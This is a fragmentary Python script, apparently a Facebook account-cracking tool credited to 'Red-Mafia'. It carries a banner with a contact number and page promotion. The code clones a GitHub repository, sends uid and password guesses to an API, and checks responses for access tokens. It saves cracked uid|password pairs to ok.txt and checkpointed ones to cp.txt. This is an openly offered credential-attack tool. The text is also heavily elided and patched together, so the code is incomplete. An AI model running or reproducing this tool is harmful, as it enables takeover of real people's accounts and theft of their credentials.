...
#AUTHOR : Red-Mafia
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO RK
...
██║  ██║    ██║  ██╗
╚═╝  ╚═╝    ╚═╝  ╚═╝
		  ASALAM O ALAIKUM\n     AUTHOR: RED-MAFIA       ↠Whatsapp:+923188214452 \n Fb page:Riaz hacker\n   " | lolcat -a -d 2 -s 50')	
...
def main():
	...
	print("\033[96;1m  [J] FOLLOW PAGE. Riazhacker\033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/Red-Mafia/fcpro")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[RK-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[RK-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
